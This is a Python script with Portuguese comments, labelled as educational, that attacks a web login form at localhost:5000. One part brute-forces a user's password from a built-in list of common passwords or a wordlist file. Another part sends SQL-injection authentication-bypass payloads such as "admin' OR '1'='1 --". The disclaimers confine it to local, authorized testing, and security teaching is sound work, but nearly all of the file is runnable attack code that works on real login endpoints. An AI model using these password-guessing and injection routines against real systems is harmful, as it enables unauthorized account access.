"""
Script de Teste de Brute Force - APENAS PARA FINS EDUCACIONAIS
Use SOMENTE na aplicação vulnerável que você criou localmente!
NUNCA use contra sistemas reais sem autorização explícita.
"""

import requests
import time
from colorama import init, Fore, Style

# Inicializa colorama para output colorido
init()

def brute_force_login(url, username, wordlist_file=None, wordlist=None):
    """
    Testa brute force no login
    
    Args:
        url: URL do endpoint de login
        username: Nome de usuário alvo
        wordlist_file: Caminho para arquivo com senhas
        wordlist: Lista de senhas (se não usar arquivo)
    """
    print(f"\n{Fore.YELLOW}{'='*60}")
    print(f"🔓 TESTE DE BRUTE FORCE - APENAS EDUCACIONAL")
    print(f"{'='*60}{Style.RESET_ALL}\n")
    
    print(f"🎯 Alvo: {url}")
    print(f"👤 Usuário: {username}\n")
    
    # Carrega lista de senhas
    if wordlist_file:
        try:
            with open(wordlist_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Arquivo {wordlist_file} não encontrado!{Style.RESET_ALL}")
            return
    elif wordlist:
        passwords = wordlist
    else:
        print(f"{Fore.RED}❌ Nenhuma wordlist fornecida!{Style.RESET_ALL}")
        return
    
    print(f"📋 Total de senhas para testar: {len(passwords)}\n")
    print(f"{Fore.CYAN}Iniciando teste...{Style.RESET_ALL}\n")
    
    # Estatísticas
    tentativas = 0
    inicio = time.time()
    
    # Cria sessão para manter cookies
    session = requests.Session()
    
    for password in passwords:
        tentativas += 1
        
        # Dados do formulário
        data = {
            'username': username,
            'password': password
        }
        
        try:
            # Envia requisição POST
            response = session.post(url, data=data, allow_redirects=False)
            
            # Verifica se login foi bem-sucedido
            # Status 302 = redirecionamento (login bem-sucedido)
            if response.status_code == 302 and '/dashboard' in response.headers.get('Location', ''):
                tempo_total = time.time() - inicio
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"✅ SENHA ENCONTRADA!")
                print(f"{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}👤 Usuário: {username}")
                print(f"🔑 Senha: {password}")
                print(f"⏱️  Tentativas: {tentativas}")
                print(f"⏱️  Tempo: {tempo_total:.2f} segundos")
                print(f"⚡ Taxa: {tentativas/tempo_total:.2f} tentativas/segundo{Style.RESET_ALL}\n")
                return True
            
            # Feedback visual
            if tentativas % 10 == 0:
                print(f"{Fore.YELLOW}[{tentativas}]{Style.RESET_ALL} Testando: {password[:20]}...", end='\r')
            
            # Pequeno delay para não sobrecarregar (opcional)
            # time.sleep(0.01)
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}❌ Erro na requisição: {e}{Style.RESET_ALL}")
            continue
    
    # Se chegou aqui, não encontrou a senha
    tempo_total = time.time() - inicio
    print(f"\n\n{Fore.RED}{'='*60}")
    print(f"❌ Senha não encontrada na wordlist")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"⏱️  Tentativas: {tentativas}")
    print(f"⏱️  Tempo: {tempo_total:.2f} segundos\n")
    return False


def gerar_wordlist_basica():
    """Gera uma wordlist básica para testes"""
    return [
        '123456', 'password', '12345678', 'qwerty', '123456789',
        'admin', 'admin123', 'password123', 'root', 'toor',
        'letmein', 'welcome', 'monkey', '1234', '12345',
        'senha', 'senha123', 'user', 'user123', 'test',
        'guest', 'abc123', 'password1', 'admin1', 'pass',
        'pass123', 'administrador', '1234567', '123123', 'qwerty123'
    ]


def demonstrar_sql_injection(url):
    """Demonstra como SQL Injection bypassa a autenticação"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"💉 DEMONSTRAÇÃO: SQL INJECTION")
    print(f"{'='*60}{Style.RESET_ALL}\n")
    
    payloads = [
        "admin' OR '1'='1",
        "admin' OR '1'='1' --",
        "admin' OR 1=1 --",
        "' OR '1'='1",
    ]
    
    for payload in payloads:
        print(f"🧪 Testando payload: {Fore.YELLOW}{payload}{Style.RESET_ALL}")
        
        data = {
            'username': payload,
            'password': 'qualquer_coisa'
        }
        
        try:
            response = requests.post(url, data=data, allow_redirects=False)
            
            if response.status_code == 302:
                print(f"{Fore.GREEN}✅ SQL Injection funcionou! Acesso garantido sem senha válida.{Style.RESET_ALL}\n")
                return True
            else:
                print(f"{Fore.RED}❌ Payload não funcionou{Style.RESET_ALL}\n")
        
        except Exception as e:
            print(f"{Fore.RED}❌ Erro: {e}{Style.RESET_ALL}\n")
    
    return False


if __name__ == '__main__':
    # Configurações
    TARGET_URL = 'http://localhost:5000/login'
    TARGET_USER = 'admin'
    
    print(f"\n{Fore.RED}{'='*60}")
    print(f"⚠️  AVISO IMPORTANTE")
    print(f"{'='*60}")
    print(f"Este script é APENAS para fins educacionais!")
    print(f"Use SOMENTE em sistemas que você possui ou tem")
    print(f"autorização explícita para testar.")
    print(f"Uso não autorizado é ILEGAL!")
    print(f"{'='*60}{Style.RESET_ALL}\n")
    
    input("Pressione ENTER para continuar...")
    
    # Menu de opções
    print(f"\n{Fore.CYAN}Escolha o tipo de teste:{Style.RESET_ALL}")
    print("1. Brute Force com wordlist básica")
    print("2. Brute Force com arquivo de wordlist")
    print("3. Demonstração de SQL Injection")
    print("4. Executar todos os testes")
    
    opcao = input("\nOpção: ").strip()
    
    if opcao == '1':
        wordlist = gerar_wordlist_basica()
        brute_force_login(TARGET_URL, TARGET_USER, wordlist=wordlist)
    
    elif opcao == '2':
        arquivo = input("Caminho do arquivo wordlist: ").strip()
        brute_force_login(TARGET_URL, TARGET_USER, wordlist_file=arquivo)
    
    elif opcao == '3':
        demonstrar_sql_injection(TARGET_URL)
    
    elif opcao == '4':
        # Primeiro tenta SQL Injection
        demonstrar_sql_injection(TARGET_URL)
        
        # Depois tenta brute force
        print(f"\n{Fore.CYAN}Agora testando brute force...{Style.RESET_ALL}")
        time.sleep(2)
        wordlist = gerar_wordlist_basica()
        brute_force_login(TARGET_URL, TARGET_USER, wordlist=wordlist)
    
    else:
        print(f"{Fore.RED}Opção inválida!{Style.RESET_ALL}")
